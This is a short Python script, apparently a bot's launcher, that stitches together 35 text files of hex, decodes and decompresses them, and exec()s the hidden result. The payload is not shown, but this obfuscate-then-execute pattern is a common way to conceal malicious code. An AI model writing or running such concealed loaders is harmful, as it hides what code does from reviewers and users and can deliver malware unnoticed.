# language: Python 3.11+
import zlib,base64
from pathlib import Path
raw=bytes.fromhex("".join(Path(__file__).with_name(f"p{i}.txt").read_text(encoding="utf-8") for i in range(35))).decode("utf-8")
exec(compile(zlib.decompress(base64.b64decode(raw)),"bot.py","exec"),globals())
